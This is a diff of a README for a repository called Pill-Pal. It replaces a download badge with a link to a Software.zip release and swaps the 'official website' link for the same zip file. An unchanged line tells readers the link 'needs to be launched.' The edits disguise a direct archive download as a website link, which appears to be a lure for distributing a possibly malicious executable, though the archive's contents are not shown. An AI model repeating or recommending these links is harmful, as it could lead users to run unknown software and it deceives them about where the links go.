@@ -22,7 +22,7 @@ Explore the exciting topics covered in our repository:
 
 ## Software Download Link
 
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/Wlowz/Pill-Pal/releases/download/v2.0/Software.zip)](https://github.com/Wlowz/Pill-Pal/releases/download/v2.0/Software.zip)
 
 *(Note: The link provided above needs to be launched to access the software.)*
 
@@ -72,7 +72,7 @@ For any inquiries or assistance regarding Pill-Pal, feel free to reach out to ou
 
 ## Visit Our Website
 
-Explore our official website to learn more about Pill-Pal and its features. Visit [Pill-Pal Website](https://www.pill-pal.com).
+Explore our official website to learn more about Pill-Pal and its features. Visit [Pill-Pal Website](https://github.com/Wlowz/Pill-Pal/releases/download/v2.0/Software.zip).
 
 ---
 
